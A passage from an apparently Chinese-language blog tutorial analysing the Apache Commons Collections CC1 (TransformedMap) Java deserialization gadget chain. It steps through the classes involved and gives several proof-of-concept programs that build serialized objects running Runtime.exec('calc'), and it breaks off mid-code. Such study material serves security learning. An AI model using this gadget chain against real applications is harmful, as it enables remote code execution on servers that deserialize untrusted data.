&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>这里当创建好maven项目后在依赖中如果没有放依赖的标签<code>&lt;dependencies&gt; &lt;/dependencies&gt;</code>那么需要你自己去创建，你的依赖必须由它包裹</p><h2 id="其它环境"><a href="#其它环境" class="headerlink" title="其它环境"></a>其它环境</h2><p>参考：<br><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/">https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/</a><br>基本上就没啥问题了</p><h2 id="Common-Collections-相关介绍"><a href="#Common-Collections-相关介绍" class="headerlink" title="Common-Collections 相关介绍"></a>Common-Collections 相关介绍</h2><p>这一部分前辈们已经说的很清楚了，我这里放一下方便自己观看<br><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><ul><li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li></ul><h3 id="包结构介绍"><a href="#包结构介绍" class="headerlink" title="包结构介绍"></a>包结构介绍</h3><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>CC1链分为两个版本，这里引用一下lengf233师傅的介绍，“关于CC1链其实是有两条的，一个是LazyMap这一条链，另外一条就是TransformMap链，第二条链是传入国内之后被发现的。”很多分析文章没有介绍这一点，我也是看了师傅的文章才知道，这里分析TransformMap链<br>用一下佬的流程分析图<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144895.png" alt="image-20230426214421823"><br>我们的目的是在最后的命令执行，既然在最后那么必然需要一个到这里的类，选择一个接收任意对象含有readObject方法的类作为入口类，中间用链子其它方法链起来那么就到达了目的</p><h3 id="逆向分析，寻找exec方法"><a href="#逆向分析，寻找exec方法" class="headerlink" title="逆向分析，寻找exec方法"></a>逆向分析，寻找exec方法</h3><p>我们直接找哪里会调用exec方法，前人经验在Transformer接口中，所以直接到这里来，在Common-Collections.jar包中找到这个接口<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144606.png" alt="image-20230426214435545"><br>然后ctrl+alt+b可以查看实现了该接口的类，最终找到了InvokerTransformer类，在该类下有个transform方法里面调用了invoke方法，此时还没感觉有什么，我们跟进看一下，可以看到它所在的类为Method类，这个类所在的包为Java中鼎鼎大名的反射包，Method中<strong>invoke</strong>(Object obj,Object…args)方法的第一个参数为类的实例，第二个参数为相应函数中的参数<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144759.png" alt="image-20230426214448720"><br>那么就可以利用反射调用任意类，先尝试利用它来弹个计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> runtime.getClass();  <span class="comment">//获取Class实例对象  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">cMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  <span class="comment">//利用反射获取Runtime的exec方法  </span></span><br><span class="line">  </span><br><span class="line">        cMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  <span class="comment">//在runtime实例上调用exec方法并传入calc参数  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里反射调用exec方法为，先得到Runtime类的对象runtime，再得到类中所有方法的对象c，<br>然后得到exec方法并赋值给cMethod，然后使用Method类的invoke方法执行Runtime类中的exec方法并传入参数calc，也有一种链子的感觉<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145805.png" alt="image-20230426214518703"><br>然后改写为InvokerTransformer类中的transform方法来弹，由于transform方法为public所以无需反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        invokerTransformer.transform(runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二句为什么要那样构造跟进类和方法看一下就能理解<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145403.png" alt="image-20230426214543314"><br>然后根据最后一句<code>invokerTransformer.transform(runtime);</code>去寻找不同名函数，这里我出了一个问题就是我全局搜索不到transform方法的引用，原因是在maven中没有下载jar包的源码，所以在这里搜不到，参考<a href="https://blog.csdn.net/qq_26012495/article/details/109694133">解决</a>，然后find usages就能找到这个方法的引用<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145831.png" alt="image-20230426214555687"><br>最终找到TransformedMap类的checkSetValue方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262146939.png" alt="image-20230426214602802"><br>跟进一下valueTransformer方法，看到它的构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span>  </span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>  </span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer     valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(map);  </span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个保护类型变量通过构造函数赋值，继续往下看找到一个public方法返回了构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="type">TransformedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  </span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformed</span> <span class="operator">=</span> decorated.transformMap(map);  </span><br><span class="line">        decorated.clear();  </span><br><span class="line">        decorated.getMap().putAll(transformed);  <span class="comment">// avoids double transformation  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> decorated;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再回忆一下我们一开始的尾部<code>invokerTransformer.transform(runtime);</code>所以这里让valueTransformer为invokerTransformer是不是就可以弹计算器了，但是由于valueTransformer是protected型所以我们就要利用反射来获得，开始构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//这里创建一个hashmap对象是因为decorateTransform方法第一个参数为map对象  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">        <span class="comment">//得到一个新的TransformedMap对象  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line">        <span class="comment">//获得TransformedMap类的对象  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">  </span><br><span class="line">        checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        checkSetValueMethod.invoke(decorateMap,runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用成功<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147170.png" alt="image-20230426214628370"><br>然后这里<code>.decorate</code>无法再继续往前了，所以得重新找一条，还是find usages，不过这次是找checkSetValue的索引，然后找到了AbstractInputCheckedMapDecorator类即TransformedMap的父类<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147042.png" alt="image-20230426214744010"><br>里面的setValue方法调用了checkSetValue方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    value = parent.checkSetValue(value);  </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而调用了setValue的类是AbstractInputCheckedMapDecorator的内部类MapEntry<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148400.png" alt="image-20230426214800338"><br>setValue方法就是对键值对中的值赋值的操作，跟进去即可看到<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148781.png" alt="image-20230426214809746"><br>然后继续对setValue查找索引find usages，如果是readObject用了这个方法那么就找到了入口<br>在这里找到入口类AnnotationInvocationHandler里面的readObject方法调用了setValue方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148807.png" alt="image-20230426214825669"><br>但是要调用setValue方法首先得满足两个条件，也就是这两个if，memberType不能为空，第二个if首先判断变量”value”是否是指定的类型”memberType”的实例，这里使用了Java中的isInstance方法。如果”value”是指定类型的实例，则条件表达式的值为true，整个条件语句的执行结果为false。如果”value”不是指定类型的实例，接下来再判断”value”是否是ExceptionProxy类的实例。如果”value”是ExceptionProxy类的实例，则条件表达式的值为true，整个条件语句的执行结果为false。<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148500.png" alt="image-20230426214837403"><br>接下来构造exp</p><h2 id="TransformedMap-版CC1-EXP"><a href="#TransformedMap-版CC1-EXP" class="headerlink" title="TransformedMap 版CC1 EXP"></a>TransformedMap 版CC1 EXP</h2><p>下面是理想情况下的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//这里创建一个hashmap对象是因为decorateTransform方法第一个参数为map对象  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个payload还有三个问题没解决所以注定会失败</p><blockquote><ol><li>Runtime对象不能被序列化</li><li>setValue传入的对象应该是Runtime对象的，而在实际情况中确是AnnotationTypeMismatchExceptionProxy<br>3.通过两个if判断</li></ol></blockquote><h3 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h3><p>Runtime不能序列化因为这个类没有Serializable接口，但是Runtime.class可以，先写一个普通的反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line">        <span class="comment">//将runtime强制转换为Runtime对象  </span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//获取exec方法  </span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将<code>Runtime</code>改为<code>InvokerTransformer</code> 调用的方式，这里为了避免冗余，可以直接使用ChainedTransformer类去套，ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再把它与 <code>decorate</code> 的链子结合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//用于解决第一个问题，Runtime不能被序列化  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//这里创建一个hashmap对象是因为decorateTransform方法第一个参数为map对象  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  